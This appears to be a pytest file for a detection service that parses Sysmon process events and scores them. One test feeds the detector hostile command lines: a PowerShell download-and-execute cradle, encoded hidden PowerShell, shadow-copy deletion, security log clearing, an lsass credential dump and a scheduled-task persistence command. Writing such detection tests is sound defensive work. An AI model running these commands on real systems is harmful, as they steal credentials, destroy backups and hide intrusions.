"""
Sysmon / EDR process events inside an alert body.

The sample is a real Sysmon Event ID 1 line: one line, values containing colons,
spaces, quotes and backslashes — which is why parsing is field-name driven.
"""

import os

os.environ.setdefault("OPENAI_API_KEY", "test-key")

from app.services import endpoint_event_service as svc

SYSMON = (
    "Process Create: RuleName: - UtcTime: 2026-08-06 08:52:41.529 "
    "ProcessGuid: {a8fa33c8-4b59-6a74-0d34-040000006b00} ProcessId: 4336 "
    "Image: C:\\Program Files\\Git\\usr\\bin\\bash.exe FileVersion: - Description: - "
    "CommandLine: \"C:\\Program Files\\Git\\bin\\..\\usr\\bin\\bash.exe\" -c \"netstat -ano | "
    "grep LISTENING; taskkill //F //IM celery.exe\" "
    "CurrentDirectory: C:\\Users\\tmoscaliuc\\OneDrive - Expertware Belgium\\Desktop\\ "
    "User: INT\\tmoscaliuc LogonId: 0x35F84B IntegrityLevel: Medium "
    "Hashes: MD5=4F96B0F8B5337360D11BB59BD103D061,"
    "SHA256=ACF4ECB52E601F7B4A37DB51B07650B5D0315EAFD010590E98079FA026DA4B7B,"
    "IMPHASH=8E6DF21BAEBF68CC126345D8EDCA4189 "
    "ParentProcessId: 48816 ParentImage: C:\\Program Files\\Git\\usr\\bin\\bash.exe "
    "ParentUser: INT\\tmoscaliuc"
)


def _signals(command_line: str, **fields) -> list[str]:
    event = {"event_type": "process_create", "fields": {"CommandLine": command_line, **fields}}
    return [signal["id"] for signal in svc.assess_event(event)]


def test_a_sysmon_line_parses_into_its_fields():
    events = svc.parse_endpoint_events(SYSMON)
    assert len(events) == 1

    event = events[0]
    fields = event["fields"]
    assert event["event_type"] == "process_create"
    assert fields["ProcessId"] == "4336"
    assert fields["Image"] == "C:\\Program Files\\Git\\usr\\bin\\bash.exe"
    assert fields["User"] == "INT\\tmoscaliuc"
    assert fields["IntegrityLevel"] == "Medium"
    # A value containing spaces, quotes and pipes survives intact…
    assert "taskkill //F //IM celery.exe" in fields["CommandLine"]
    # …and stops before the next field rather than swallowing it.
    assert "CurrentDirectory" not in fields["CommandLine"]
    assert fields["CurrentDirectory"].startswith("C:\\Users\\tmoscaliuc\\OneDrive")


def test_empty_sysmon_fields_are_dropped():
    fields = svc.parse_endpoint_events(SYSMON)[0]["fields"]
    assert "RuleName" not in fields          # written as "-"
    assert "FileVersion" not in fields


def test_hashes_are_split_by_algorithm():
    hashes = svc.parse_endpoint_events(SYSMON)[0]["hashes"]
    assert hashes["sha256"].startswith("acf4ecb5")
    assert hashes["md5"] == "4f96b0f8b5337360d11bb59bd103d061"
    assert hashes["imphash"] == "8e6df21baebf68cc126345d8edca4189"


def test_prose_without_event_fields_is_not_an_event():
    assert svc.parse_endpoint_events("User clicked https://evil.com/login and got phished") == []
    assert svc.parse_endpoint_events("") == []


def test_several_events_in_one_body_are_split():
    body = SYSMON + " " + SYSMON.replace("ProcessId: 4336", "ProcessId: 9999")
    events = svc.parse_endpoint_events(body)
    assert [event["fields"]["ProcessId"] for event in events] == ["4336", "9999"]


def test_the_sample_event_reads_as_admin_tooling_not_an_attack():
    report = svc.build_event_report(
        svc.parse_endpoint_events(SYSMON)[0],
        schema_version="1.0",
        started_at="2026-08-06T09:00:00+00:00",
        completed_at="2026-08-06T09:00:00+00:00",
    )
    ids = [finding["summary"] for finding in report["findings"]]

    assert report["report_type"] == "endpoint_event"
    assert report["event"]["image"].endswith("bash.exe")
    assert report["verdict"]["classification"] == "suspicious"   # taskkill + recon
    assert report["verdict"]["risk_score"] == 50
    assert any("termination" in title for title in ids)
    assert any("reconnaissance" in title for title in ids)


def test_the_dangerous_patterns_are_the_ones_that_score_high():
    assert "encoded_powershell" in _signals("powershell.exe -nop -w hidden -enc SQBFAFgA")
    assert "download_cradle" in _signals("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/y')\"")
    assert "shadow_copy_tampering" in _signals("vssadmin.exe delete shadows /all /quiet")
    assert "log_tampering" in _signals("wevtutil cl Security")
    assert "credential_access" in _signals("rundll32 comsvcs.dll MiniDump 660 lsass.dmp full")
    assert "persistence" in _signals("schtasks /create /tn Updater /tr evil.exe /sc minute")


def test_office_spawning_a_shell_is_flagged():
    ids = _signals(
        "powershell -c whoami",
        Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ParentImage="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
    )
    assert "office_spawns_shell" in ids


def test_execution_from_a_user_writable_path_is_flagged():
    ids = _signals("run.exe", Image="C:\\Users\\bob\\AppData\\Local\\Temp\\run.exe")
    assert "user_writable_execution" in ids
    # A managed install location is not.
    assert "user_writable_execution" not in _signals(
        "svc.exe", Image="C:\\Program Files\\Vendor\\svc.exe"
    )


def test_a_quiet_event_produces_no_verdict_noise():
    report = svc.build_event_report(
        {"event_type": "process_create", "fields": {"Image": "C:\\Windows\\System32\\svchost.exe"}},
        schema_version="1.0",
        started_at="t",
        completed_at="t",
    )
    assert report["findings"] == []
    assert report["verdict"]["classification"] == "inconclusive"
    assert report["verdict"]["risk_score"] == 0
